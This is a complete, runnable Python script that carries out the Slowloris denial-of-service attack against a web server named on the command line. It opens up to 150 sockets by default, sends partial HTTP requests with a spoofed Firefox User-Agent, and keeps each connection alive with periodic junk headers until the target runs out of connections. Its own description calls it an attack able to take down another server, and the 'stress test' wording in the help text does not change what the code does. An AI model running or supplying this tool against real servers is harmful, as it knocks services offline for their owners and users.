#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time

parser = argparse.ArgumentParser(
    description="Slowloris is a highly-targeted attack, enabling one web server to take down another server, without affecting other services or ports on the target network."
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)

parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


list_of_sockets = []
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)


def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, args.port))
    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    s.send_header("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0")
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def slowloris_iteration():
    print("Sending keep-alive headers...")
    print(f"Socket count: {len(list_of_sockets)}")

    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    print(f"Creating {diff} new sockets...")
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            print(f"Failed to create new socket: {e}")
            break


def main():
    ip = args.host
    socket_count = args.sockets
    print(f"Attacking {ip} with {socket_count} sockets.")

    print("Creating sockets...")
    for _ in range(socket_count):
        try:
            s = init_socket(ip)
        except socket.error as e:
            print(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris")
            break
        except Exception as e:
            print(f"Error in Slowloris iteration: {e}")
        print(f"Sleeping for {args.sleeptime} seconds")
        time.sleep(args.sleeptime)


main()
